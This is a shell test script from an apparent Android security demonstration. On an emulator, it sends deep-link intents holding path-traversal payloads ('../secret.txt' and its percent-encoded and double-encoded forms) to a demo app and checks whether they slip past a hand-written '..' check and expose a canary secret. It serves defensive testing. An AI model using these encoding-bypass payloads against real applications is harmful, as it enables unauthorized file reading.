#!/usr/bin/env bash
# Threat 6 (SPEC section 2): encoding evasion against a hand-written denylist (manual validation
# baseline, SPEC section 10.3). EMULATOR ONLY. adb alone.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t6: encoding evasion of a manual '..' check (threat 6) =="
require_emulator; require_victim
TIMEOUT=6
reset_state
BASE="https://shezguard.example/manual?name="
for payload in "../secret.txt" "%2e%2e%2fsecret.txt" "%252e%252e%252fsecret.txt"; do
    case "$payload" in
        ../*) label="CONTROL, raw '..' (the manual check should reject it)" ;;
        %25*) label="BYPASS, double-encoded" ;;
        *) label="BYPASS, percent-encoded" ;;
    esac
    echo "ATTACK ($label): $BASE$payload"
    send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$BASE$payload' $VICTIM"
    sleep 2
    logs -s 'ShezDemo:*' | grep ManualCheckActivity | tail -1 | sed 's/^/  log: /'
done
echo "LOOK FOR: 'ShezDemo ... file content: CANARY-SECRET-7f3a ...' after a BYPASS payload."
verdict "ShezDemo.*CANARY-SECRET-7f3a" "$VICTIM/\.demo\.ManualCheckActivity"
